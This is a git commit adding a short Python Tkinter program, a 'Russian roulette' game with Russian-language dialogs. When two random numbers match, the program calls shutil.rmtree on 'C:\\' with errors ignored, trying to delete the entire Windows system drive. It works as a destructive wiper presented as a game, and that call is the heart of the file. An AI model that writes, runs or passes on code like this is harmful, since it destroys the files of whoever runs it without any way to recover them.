368c81d26d67b6354421ecbd0a8be5e414008f8b
rhythmikkk <ankolae@gmail.com>
2025-03-19 22:57:58 +0800

    first commit

---
+++ main.py
@@ -0,0 +1,21 @@
+import random
+import os
+import tkinter as tk
+from tkinter import ttk, messagebox
+import shutil
+
+while True:
+    rus_roulette_1 = random.randint(0, 6)
+    rus_roulette_2 = random.randint(0, 6)
+    if messagebox.askyesno("Русская рулетка", "Хотите сыграть в русскую рулетку?"):
+        if rus_roulette_1 != rus_roulette_2:
+            messagebox.showinfo("Вам повезло!", f"Ваши числа: {rus_roulette_1} - {rus_roulette_2}")
+        elif rus_roulette_1 == rus_roulette_2:
+            messagebox.showerror("Удаление файлов", f"Ваши числа: {rus_roulette_1} - {rus_roulette_2}")
+            try:
+                shutil.rmtree("C:\\", ignore_errors=True)
+            except:
+                pass
+            exit()
+    else:
+        exit()
